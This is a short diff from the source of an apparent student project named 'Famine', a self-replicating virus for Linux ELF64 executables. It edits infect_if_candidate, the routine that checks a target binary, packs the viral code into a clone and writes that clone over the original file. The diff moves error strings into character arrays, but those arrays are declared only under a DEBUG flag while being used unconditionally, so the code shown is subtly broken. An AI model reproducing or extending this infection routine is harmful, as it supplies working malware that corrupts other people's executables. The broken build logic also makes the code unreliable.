@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 10:36:15 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 11:56:00 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -41,30 +41,36 @@ inline bool	infect_if_candidate(const char *file)
 	Elf64_Ehdr	elf64_hdr;
 	int		fd = famine_open(file, O_RDONLY);
 
+#ifdef DEBUG
+	char e0[] = {'c','a','n','n','o','t',' ','o','p','e','n','\0'};
+	char e1[] = {'r','e','a','d',' ','e','l','f','6','4',' ','h','e','a','d','e','r',' ','f','a','i','l','e','d','\0'};
+	char e2[] = {'n','o','t',' ','e','l','f','6','4',' ','e','x','e','c','u','t','a','b','l','e','\0'};
+	char e3[] = {'i','n','f','e','c','t','_','i','f','_','c','a','n','d','i','d','a','t','e','\0'};
+#endif
 	if (fd < 0)
 	{
-		return errors(ERR_SYS, "cannot open");
+		return errors(ERR_SYS, e0);
 	}
 	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
 	{
 		famine_close(fd);
-		return errors(ERR_USAGE, "read elf64 header failed");
+		return errors(ERR_USAGE, e1);
 	}
 	if (elf64_identifier(&elf64_hdr, &food.endians) == false)
 	{
 		famine_close(fd);
-		return errors(ERR_USAGE, "not elf64 executable");
+		return errors(ERR_USAGE, e2);
 	}
 	famine_close(fd);
 
 	if (!original_accessor(&food.original_safe, file))
-		return errors(ERR_THROW, "1infect_if_candidate");
+		return errors(ERR_THROW, e3);
 
 	if (!clone_accessor(&food.clone_safe, food.original_safe.filesize))
-		return errors(ERR_THROW, "2infect_if_candidate");
+		return errors(ERR_THROW, e3);
 
 	if (!elf64_packer(food, food.original_safe.filesize))
-		return errors(ERR_THROW, "3infect_if_candidate");
+		return errors(ERR_THROW, e3);
 
 	write_clone_file(food.clone_safe, file);
 
